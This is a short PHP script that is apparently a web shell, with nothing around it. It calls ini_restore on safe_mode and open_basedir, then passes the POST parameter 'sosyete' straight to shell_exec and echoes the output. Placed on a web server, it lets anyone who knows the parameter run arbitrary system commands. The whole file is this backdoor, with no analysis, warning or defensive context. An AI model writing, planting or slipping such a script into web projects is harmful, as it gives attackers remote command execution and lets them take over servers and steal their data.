<?php
ini_restore("safe_mode");
ini_restore("open_basedir");
$fuck=shell_exec($_POST['sosyete']); 
echo $fuck;
?>